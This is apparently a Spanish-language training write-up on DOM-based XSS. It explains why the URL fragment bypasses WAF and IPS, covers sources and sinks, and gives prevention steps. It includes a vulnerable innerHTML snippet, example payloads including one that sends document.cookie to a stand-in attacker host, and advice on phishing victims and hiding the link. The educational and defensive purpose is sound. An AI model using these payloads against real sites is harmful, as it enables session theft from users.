# Objetivo 2: Anatomía del DOM XSS

## Escenario

A diferencia del XSS Almacenado y del Reflejado, el **DOM-Based XSS** es indetectable para muchos sistemas de prevención de intrusos (IPS) y firewalls (WAF). Este documento explica por qué ocurre esto, analizando cómo manejan los navegadores el fragmento `#` de una URL y qué sucede cuando el JavaScript procesa entradas como `location.hash` de forma insegura.

---

## 1. Los tres tipos de XSS: dónde vive el payload

| Tipo | ¿Dónde está el payload? | ¿Pasa por el servidor? |
|------|------------------------|------------------------|
| **Almacenado** | En la base de datos (comentario, perfil) | Sí — se guarda y se sirve a todas las víctimas |
| **Reflejado** | En la petición HTTP (parámetro de URL o POST) | Sí — el servidor lo recibe y lo "refleja" en la respuesta |
| **DOM-Based** | **En el fragmento de la URL, procesado por JavaScript en el navegador** | **No — el servidor nunca lo ve** |

Esa última fila es la clave de todo: **en el DOM XSS, el payload malicioso nunca llega al servidor**.

---

## 2. La pista clave: el fragmento `#` de la URL

Una URL tiene esta estructura:

```
https://tienda.com/pagina?query=oferta#fragmento
                                  ↑            ↑
                              query string   fragment (hash)
```

El fragmento (todo lo que sigue a `#`) tiene una propiedad única en el protocolo HTTP:

> **El navegador NUNCA envía el fragmento al servidor.**

El `#` y todo lo que sigue viaja **solo en el cliente**: el navegador lo usa internamente (para anclas de página, para SPAs con routing) y lo elimina de la petición HTTP. El servidor recibe:

```
GET /pagina?query=oferta    ← sin el #fragmento
```

Esto significa que un payload como:

```
https://tienda.com/pagina#<img src=x onerror=alert(document.cookie)>
```

**viaja completo hasta el navegador de la víctima** (está en el enlace que ella clickeó), pero el servidor solo ve `GET /pagina` — limpio, inofensivo, idéntico a cualquier petición legítima.

---

## 3. Anatomía del ataque: sources y sinks

El DOM XSS ocurre cuando el JavaScript de la página toma datos de una **fuente controlable por el usuario (source)** y los pasa a una **función peligrosa (sink)** sin validarlos.

### Fuentes (sources) típicas

```js
location.hash        // el fragmento # — nunca viaja al servidor
location.search      // el query string
location.href
document.referrer
window.name
localStorage / sessionStorage
document.cookie (si no es HttpOnly)
```

### Sinks (sumideros) peligrosos

```js
element.innerHTML = dato          // inserta HTML crudo → ejecuta
document.write(dato)
element.outerHTML = dato
eval(dato)
setTimeout("código " + dato)
element.setAttribute("href", dato)  // javascript: URLs
jQuery: $(dato), .html(dato), .append(dato)
```

### El código vulnerable

```js
// La página muestra un saludo personalizado leyendo el fragmento:
document.getElementById("welcome").innerHTML =
    "Bienvenido, " + location.hash.substring(1);
```

El atacante envía a la víctima el enlace:

```
https://app.com/home#<img src=x onerror=fetch('https://atacante.com/?c='+document.cookie)>
```

El navegador carga `https://app.com/home` (el servidor responde la página normal, sin nada malicioso), y luego **el propio JavaScript de la página** lee el fragmento y lo inyecta en el DOM con `innerHTML` → el navegador interpreta el payload como HTML → se ejecuta el `onerror`.

---

## 4. Por qué WAF e IPS no lo ven

### a) El payload no viaja en la petición HTTP

El WAF y el IPS inspeccionan **tráfico HTTP**: peticiones y respuestas que cruzan la red.

- **Petición al servidor**: `GET /home` — sin payload, sin nada sospechoso.
- **Respuesta del servidor**: el HTML/JS legítimo de la aplicación.

El payload `#<img src=x onerror=...>` **nunca cruzó la red como parte de una petición**. Está en la barra de direcciones del navegador de la víctima y en el enlace que el atacante le envió. No hay nada que el WAF pueda inspeccionar: **el ataque ocurre íntegramente dentro del navegador de la víctima, después de que el tráfico pasó por el WAF**.

### b) El servidor responde contenido 100% legítimo

El WAF también inspecciona las **respuestas** buscando payloads reflejados. Pero en DOM XSS la respuesta contiene solo el JavaScript legítimo de la aplicación (con el `innerHTML` vulnerable). El código malicioso no está en la respuesta: lo **construye en el cliente** la combinación de `location.hash` + el sink inseguro.

### c) El punto ciego es temporal y espacial

- **Espacialmente**: el exploit vive en el cliente (DOM del navegador), fuera del perímetro que el WAF/IPS monitorea.
- **Temporalmente**: ocurre *después* de que el WAF hizo su trabajo (la respuesta ya fue entregada).

Es el mismo patrón del Objetivo 5 de la serie anterior (cifrado en el cliente): **poner la zona vulnerable donde el control no llega**. El WAF vigila el canal servidor↔cliente; el DOM XSS ocurre dentro del cliente.

### Comparación con los otros tipos

| | Reflejado | Almacenado | DOM-Based |
|--|-----------|------------|-----------|
| El payload cruza el servidor | Sí (en la petición) | Sí (al guardarse) | **No** |
| El WAF puede verlo en el tráfico | A veces (si no está ofuscado) | A veces | **No** |
| Dónde se ejecuta | Respuesta del servidor | Respuesta del servidor | **Cliente, vía JS de la página** |

---

## 5. Cómo se explota en la práctica

1. El atacante encuentra un sink inseguro (ej. `innerHTML` con `location.hash`).
2. Construye el enlace malicioso con el payload en el fragmento.
3. **Lo envía a la víctima** (email, chat, comentario con enlace): el phishing es parte del ataque.
4. La víctima hace clic → su navegador carga la página legítima → el JS de la página procesa el fragmento → el payload se ejecuta en el origen de la aplicación (con acceso a su sesión, cookies, DOM).

Nota: el atacante suele acortar/ocultar el payload (acortadores de URL, codificación) para que la víctima no desconfíe del enlace.

---

## 6. Cómo se previene

1. **Nunca usar sinks peligrosos con datos no confiables**: preferir `textContent` en vez de `innerHTML`, `setAttribute` seguro, evitar `eval` y `document.write`.
2. **Sanitizar en el cliente** si el dato debe insertarse como HTML: DOMPurify.
3. **Validar/esquematizar** lo que el JS espera del fragmento (ej. si `#tab=perfil`, validar contra lista blanca de valores).
4. **Trusted Types** (Chrome): API del navegador que obliga a que toda asignación a sinks pase por una política de sanitización.
5. **CSP** estricta (`script-src 'self'`, sin `unsafe-inline`) para limitar el impacto.
6. **Auditoría de fuentes y sinks**: herramientas de análisis estático (ej. semgrep) y revisión manual de todo uso de `location.*` que termine en `innerHTML`, `eval`, etc.

---

## 6. Resumen

> **Conclusión:** el DOM XSS es invisible para WAF e IPS porque **el ataque nunca cruza la red**: el payload viaja en el fragmento `#` de la URL, que el navegador no envía al servidor, y se ejecuta cuando el JavaScript legítimo de la propia página lo procesa con un sink inseguro (`innerHTML`, `eval`...). El WAF inspecciona el tráfico servidor↔cliente; el DOM XSS ocurre *después*, dentro del navegador de la víctima. Es la misma lección de toda la serie: los controles que solo miran el canal (red, peticiones) son ciegos a lo que sucede en el extremo que no controlan — y el navegador de la víctima es, para el WAF, un punto ciego total.
